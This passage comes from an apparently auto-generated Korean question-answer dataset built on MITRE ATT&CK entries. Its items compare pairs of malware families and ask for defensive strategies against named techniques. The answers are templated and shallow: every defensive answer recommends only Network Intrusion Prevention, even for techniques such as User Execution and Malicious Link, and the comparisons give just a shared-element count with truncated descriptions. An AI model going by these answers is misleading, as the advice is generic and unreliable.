      "answer": "InvisiMole와 Attor는 25개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... Attor는 [Attor](https://attack.mitre.org/software/S0438) is a Windows-based espionage platform that has been...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 25
      }
    },
    {
      "question": "Bumblebee와 Latrodectus의 유사점과 차이점을 비교하라.",
      "answer": "Bumblebee와 Latrodectus는 25개의 공통 요소를 가지고 있다. Bumblebee는 [Bumblebee](https://attack.mitre.org/software/S1039) is a custom loader written in C++ that has been... Latrodectus는 [Latrodectus](https://attack.mitre.org/software/S1160) is a Windows malware downloader that has been...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 25
      }
    },
    {
      "question": "Metamorfo와 RTM의 유사점과 차이점을 비교하라.",
      "answer": "Metamorfo와 RTM는 25개의 공통 요소를 가지고 있다. Metamorfo는 [Metamorfo](https://attack.mitre.org/software/S0455) is a Latin-American banking trojan operated by ... RTM는 [RTM](https://attack.mitre.org/software/S0148) is custom malware written in Delphi. It is used by th...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 25
      }
    },
    {
      "question": "PlugX와 Metamorfo의 유사점과 차이점을 비교하라.",
      "answer": "PlugX와 Metamorfo는 25개의 공통 요소를 가지고 있다. PlugX는 [PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) with modular plugins ... Metamorfo는 [Metamorfo](https://attack.mitre.org/software/S0455) is a Latin-American banking trojan operated by ...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 25
      }
    },
    {
      "question": "InvisiMole와 DarkGate의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 DarkGate는 25개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... DarkGate는 [DarkGate](https://attack.mitre.org/software/S1111) first emerged in 2018 and has evolved into an in...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 25
      }
    },
    {
      "question": "TrickBot와 Latrodectus의 유사점과 차이점을 비교하라.",
      "answer": "TrickBot와 Latrodectus는 25개의 공통 요소를 가지고 있다. TrickBot는 [TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program written in C++ that ... Latrodectus는 [Latrodectus](https://attack.mitre.org/software/S1160) is a Windows malware downloader that has been...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 25
      }
    },
    {
      "question": "InvisiMole와 Okrum의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 Okrum는 24개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... Okrum는 [Okrum](https://attack.mitre.org/software/S0439) is a Windows backdoor that has been seen in use sin...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 24
      }
    },
    {
      "question": "TONESHELL와 PlugX의 유사점과 차이점을 비교하라.",
      "answer": "TONESHELL와 PlugX는 24개의 공통 요소를 가지고 있다. TONESHELL는 [TONESHELL](https://attack.mitre.org/software/S1239) is a custom backdoor that has been used since a... PlugX는 [PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) with modular plugins ...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 24
      }
    },
    {
      "question": "Machete와 InvisiMole의 유사점과 차이점을 비교하라.",
      "answer": "Machete와 InvisiMole는 24개의 공통 요소를 가지고 있다. Machete는 [Machete](https://attack.mitre.org/software/S0409) is a cyber espionage toolset used by [Machete](ht... InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 24
      }
    },
    {
      "question": "NETWIRE와 InvisiMole의 유사점과 차이점을 비교하라.",
      "answer": "NETWIRE와 InvisiMole는 24개의 공통 요소를 가지고 있다. NETWIRE는 [NETWIRE](https://attack.mitre.org/software/S0198) is a publicly available, multiplatform remote adm... InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 24
      }
    },
    {
      "question": "DarkWatchman와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "DarkWatchman와 QakBot는 24개의 공통 요소를 가지고 있다. DarkWatchman는 [DarkWatchman](https://attack.mitre.org/software/S0673) is a lightweight JavaScript-based remote acc... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 24
      }
    },
    {
      "question": "Lokibot와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Lokibot와 QakBot는 24개의 공통 요소를 가지고 있다. Lokibot는 [Lokibot](https://attack.mitre.org/software/S0447) is a widely distributed information stealer that ... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 24
      }
    },
    {
      "question": "PlugX와 KONNI의 유사점과 차이점을 비교하라.",
      "answer": "PlugX와 KONNI는 24개의 공통 요소를 가지고 있다. PlugX는 [PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) with modular plugins ... KONNI는 [KONNI](https://attack.mitre.org/software/S0356) is a remote access tool that security researchers a...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 24
      }
    },
    {
      "question": "Metamorfo와 Grandoreiro의 유사점과 차이점을 비교하라.",
      "answer": "Metamorfo와 Grandoreiro는 24개의 공통 요소를 가지고 있다. Metamorfo는 [Metamorfo](https://attack.mitre.org/software/S0455) is a Latin-American banking trojan operated by ... Grandoreiro는 [Grandoreiro](https://attack.mitre.org/software/S0531) is a banking trojan written in Delphi that wa...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 24
      }
    },
    {
      "question": "InvisiMole와 RTM의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 RTM는 24개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... RTM는 [RTM](https://attack.mitre.org/software/S0148) is custom malware written in Delphi. It is used by th...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 24
      }
    },
    {
      "question": "PUBLOAD와 InvisiMole의 유사점과 차이점을 비교하라.",
      "answer": "PUBLOAD와 InvisiMole는 24개의 공통 요소를 가지고 있다. PUBLOAD는 [PUBLOAD](https://attack.mitre.org/software/S1228) is a stager malware that has been observed instal... InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 24
      }
    },
    {
      "question": "TrickBot와 Cobalt Strike의 유사점과 차이점을 비교하라.",
      "answer": "TrickBot와 Cobalt Strike는 23개의 공통 요소를 가지고 있다. TrickBot는 [TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program written in C++ that ... Cobalt Strike는 [Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote acce...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "Bazar와 Cobalt Strike의 유사점과 차이점을 비교하라.",
      "answer": "Bazar와 Cobalt Strike는 23개의 공통 요소를 가지고 있다. Bazar는 [Bazar](https://attack.mitre.org/software/S0534) is a downloader and backdoor that has been used sin... Cobalt Strike는 [Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote acce...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "PlugX와 RTM의 유사점과 차이점을 비교하라.",
      "answer": "PlugX와 RTM는 23개의 공통 요소를 가지고 있다. PlugX는 [PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) with modular plugins ... RTM는 [RTM](https://attack.mitre.org/software/S0148) is custom malware written in Delphi. It is used by th...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "Raspberry Robin와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Raspberry Robin와 QakBot는 23개의 공통 요소를 가지고 있다. Raspberry Robin는 [Raspberry Robin](https://attack.mitre.org/software/S1130) is initial access malware first identifie... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "Latrodectus와 Saint Bot의 유사점과 차이점을 비교하라.",
      "answer": "Latrodectus와 Saint Bot는 23개의 공통 요소를 가지고 있다. Latrodectus는 [Latrodectus](https://attack.mitre.org/software/S1160) is a Windows malware downloader that has been... Saint Bot는 [Saint Bot](https://attack.mitre.org/software/S1018) is a .NET downloader that has been used by [Sai...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "Crimson와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Crimson와 QakBot는 23개의 공통 요소를 가지고 있다. Crimson는 [Crimson](https://attack.mitre.org/software/S0115) is a remote access Trojan that has been used by [... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "InvisiMole와 Gelsemium의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 Gelsemium는 23개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... Gelsemium는 [Gelsemium](https://attack.mitre.org/software/S0666) is a modular malware comprised of a dropper (Ge...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "DarkGate와 Saint Bot의 유사점과 차이점을 비교하라.",
      "answer": "DarkGate와 Saint Bot는 23개의 공통 요소를 가지고 있다. DarkGate는 [DarkGate](https://attack.mitre.org/software/S1111) first emerged in 2018 and has evolved into an in... Saint Bot는 [Saint Bot](https://attack.mitre.org/software/S1018) is a .NET downloader that has been used by [Sai...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "TrickBot와 KONNI의 유사점과 차이점을 비교하라.",
      "answer": "TrickBot와 KONNI는 23개의 공통 요소를 가지고 있다. TrickBot는 [TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program written in C++ that ... KONNI는 [KONNI](https://attack.mitre.org/software/S0356) is a remote access tool that security researchers a...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "Bisonal와 KONNI의 유사점과 차이점을 비교하라.",
      "answer": "Bisonal와 KONNI는 23개의 공통 요소를 가지고 있다. Bisonal는 [Bisonal](https://attack.mitre.org/software/S0268) is a remote access tool (RAT) that has been used ... KONNI는 [KONNI](https://attack.mitre.org/software/S0356) is a remote access tool that security researchers a...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "Latrodectus와 KONNI의 유사점과 차이점을 비교하라.",
      "answer": "Latrodectus와 KONNI는 23개의 공통 요소를 가지고 있다. Latrodectus는 [Latrodectus](https://attack.mitre.org/software/S1160) is a Windows malware downloader that has been... KONNI는 [KONNI](https://attack.mitre.org/software/S0356) is a remote access tool that security researchers a...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "Bumblebee와 Bazar의 유사점과 차이점을 비교하라.",
      "answer": "Bumblebee와 Bazar는 23개의 공통 요소를 가지고 있다. Bumblebee는 [Bumblebee](https://attack.mitre.org/software/S1039) is a custom loader written in C++ that has been... Bazar는 [Bazar](https://attack.mitre.org/software/S0534) is a downloader and backdoor that has been used sin...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "SysUpdate와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "SysUpdate와 QakBot는 23개의 공통 요소를 가지고 있다. SysUpdate는 [SysUpdate](https://attack.mitre.org/software/S0663) is a backdoor written in C++ that has been used... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "Metamorfo와 KONNI의 유사점과 차이점을 비교하라.",
      "answer": "Metamorfo와 KONNI는 23개의 공통 요소를 가지고 있다. Metamorfo는 [Metamorfo](https://attack.mitre.org/software/S0455) is a Latin-American banking trojan operated by ... KONNI는 [KONNI](https://attack.mitre.org/software/S0356) is a remote access tool that security researchers a...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "TrickBot와 Saint Bot의 유사점과 차이점을 비교하라.",
      "answer": "TrickBot와 Saint Bot는 23개의 공통 요소를 가지고 있다. TrickBot는 [TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program written in C++ that ... Saint Bot는 [Saint Bot](https://attack.mitre.org/software/S1018) is a .NET downloader that has been used by [Sai...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "RTM와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "RTM와 QakBot는 23개의 공통 요소를 가지고 있다. RTM는 [RTM](https://attack.mitre.org/software/S0148) is custom malware written in Delphi. It is used by th... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "PlugX와 Latrodectus의 유사점과 차이점을 비교하라.",
      "answer": "PlugX와 Latrodectus는 23개의 공통 요소를 가지고 있다. PlugX는 [PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) with modular plugins ... Latrodectus는 [Latrodectus](https://attack.mitre.org/software/S1160) is a Windows malware downloader that has been...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "InvisiMole와 Latrodectus의 유사점과 차이점을 비교하라.",
      "answer": "InvisiMole와 Latrodectus는 23개의 공통 요소를 가지고 있다. InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use... Latrodectus는 [Latrodectus](https://attack.mitre.org/software/S1160) is a Windows malware downloader that has been...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "FunnyDream와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "FunnyDream와 QakBot는 23개의 공통 요소를 가지고 있다. FunnyDream는 [FunnyDream](https://attack.mitre.org/software/S1044) is a backdoor with multiple components that wa... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "SUNBURST와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "SUNBURST와 QakBot는 23개의 공통 요소를 가지고 있다. SUNBURST는 [SUNBURST](https://attack.mitre.org/software/S0559) is a trojanized DLL designed to fit within the S... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "Stuxnet와 InvisiMole의 유사점과 차이점을 비교하라.",
      "answer": "Stuxnet와 InvisiMole는 23개의 공통 요소를 가지고 있다. Stuxnet는 [Stuxnet](https://attack.mitre.org/software/S0603) was the first publicly reported piece of malware ... InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "Crimson와 InvisiMole의 유사점과 차이점을 비교하라.",
      "answer": "Crimson와 InvisiMole는 23개의 공통 요소를 가지고 있다. Crimson는 [Crimson](https://attack.mitre.org/software/S0115) is a remote access Trojan that has been used by [... InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "Bumblebee와 InvisiMole의 유사점과 차이점을 비교하라.",
      "answer": "Bumblebee와 InvisiMole는 23개의 공통 요소를 가지고 있다. Bumblebee는 [Bumblebee](https://attack.mitre.org/software/S1039) is a custom loader written in C++ that has been... InvisiMole는 [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been use...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 23
      }
    },
    {
      "question": "TrickBot와 PlugX의 유사점과 차이점을 비교하라.",
      "answer": "TrickBot와 PlugX는 22개의 공통 요소를 가지고 있다. TrickBot는 [TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program written in C++ that ... PlugX는 [PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) with modular plugins ...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 22
      }
    },
    {
      "question": "Machete와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Machete와 QakBot는 22개의 공통 요소를 가지고 있다. Machete는 [Machete](https://attack.mitre.org/software/S0409) is a cyber espionage toolset used by [Machete](ht... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 22
      }
    },
    {
      "question": "TONESHELL와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "TONESHELL와 QakBot는 22개의 공통 요소를 가지고 있다. TONESHELL는 [TONESHELL](https://attack.mitre.org/software/S1239) is a custom backdoor that has been used since a... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 22
      }
    },
    {
      "question": "Zebrocy와 QakBot의 유사점과 차이점을 비교하라.",
      "answer": "Zebrocy와 QakBot는 22개의 공통 요소를 가지고 있다. Zebrocy는 [Zebrocy](https://attack.mitre.org/software/S0251) is a Trojan that has been used by [APT28](https:/... QakBot는 [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used pri...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 22
      }
    },
    {
      "question": "Crimson와 PlugX의 유사점과 차이점을 비교하라.",
      "answer": "Crimson와 PlugX는 22개의 공통 요소를 가지고 있다. Crimson는 [Crimson](https://attack.mitre.org/software/S0115) is a remote access Trojan that has been used by [... PlugX는 [PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) with modular plugins ...",
      "difficulty": "hard",
      "type": "comparative_analysis",
      "metadata": {
        "common_count": 22
      }
    },
    {
      "question": "DNS을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "DNS 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Shark, Uroburos를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "DNS"
      }
    },
    {
      "question": "Protocol or Service Impersonation을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Protocol or Service Impersonation 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Okrum, TONESHELL를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Protocol or Service Impersonation"
      }
    },
    {
      "question": "One-Way Communication을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "One-Way Communication 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 HAMMERTOSS, UPSTYLE를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "One-Way Communication"
      }
    },
    {
      "question": "Non-Standard Port을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Non-Standard Port 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 VIRTUALPITA, Cyclops Blink를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Non-Standard Port"
      }
    },
    {
      "question": "Publish/Subscribe Protocols을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Publish/Subscribe Protocols 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 GLOOXMAIL를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Publish/Subscribe Protocols"
      }
    },
    {
      "question": "Encrypted Channel을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Encrypted Channel 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Emotet, MacMa를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Encrypted Channel"
      }
    },
    {
      "question": "Web Protocols을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Web Protocols 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 SNUGRIDE, NICECURL를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Web Protocols"
      }
    },
    {
      "question": "Standard Encoding을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Standard Encoding 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 HOPLIGHT, GLASSTOKEN를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Standard Encoding"
      }
    },
    {
      "question": "Exfiltration Over Unencrypted Non-C2 Protocol을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Exfiltration Over Unencrypted Non-C2 Protocol 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Cherry Picker, InvisibleFerret를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Exfiltration Over Unencrypted Non-C2 Protocol"
      }
    },
    {
      "question": "External Proxy을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "External Proxy 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 TrickBot, InvisiMole를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "External Proxy"
      }
    },
    {
      "question": "Protocol Tunneling을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Protocol Tunneling 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Cyclops Blink, QakBot를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Protocol Tunneling"
      }
    },
    {
      "question": "Fallback Channels을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Fallback Channels 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Anchor, BlackEnergy를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Fallback Channels"
      }
    },
    {
      "question": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 IcedID를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
      }
    },
    {
      "question": "Dynamic Resolution을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Dynamic Resolution 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 SUNBURST, Bisonal를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Dynamic Resolution"
      }
    },
    {
      "question": "Multi-Stage Channels을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Multi-Stage Channels 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Chaos, BACKSPACE를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Multi-Stage Channels"
      }
    },
    {
      "question": "Application Layer Protocol을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Application Layer Protocol 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Nightdoor, Raspberry Robin를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Application Layer Protocol"
      }
    },
    {
      "question": "Exfiltration Over C2 Channel을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Exfiltration Over C2 Channel 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 DarkGate, PingPull를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Exfiltration Over C2 Channel"
      }
    },
    {
      "question": "Ingress Tool Transfer을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Ingress Tool Transfer 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Agent.btz, Javali를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Ingress Tool Transfer"
      }
    },
    {
      "question": "Non-Application Layer Protocol을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Non-Application Layer Protocol 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Bandook, Sardonic를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Non-Application Layer Protocol"
      }
    },
    {
      "question": "Web Service을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Web Service 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Nightdoor, Latrodectus를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Web Service"
      }
    },
    {
      "question": "Data Encoding을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Data Encoding 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 H1N1, Linux Rabbit를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Data Encoding"
      }
    },
    {
      "question": "Domain Generation Algorithms을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Domain Generation Algorithms 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Ebury, Bazar를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Domain Generation Algorithms"
      }
    },
    {
      "question": "User Execution을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "User Execution 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Raspberry Robin, Lumma Stealer를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "User Execution"
      }
    },
    {
      "question": "Malicious Link을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Malicious Link 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Emotet, AppleJeus를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Malicious Link"
      }
    },
    {
      "question": "Symmetric Cryptography을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
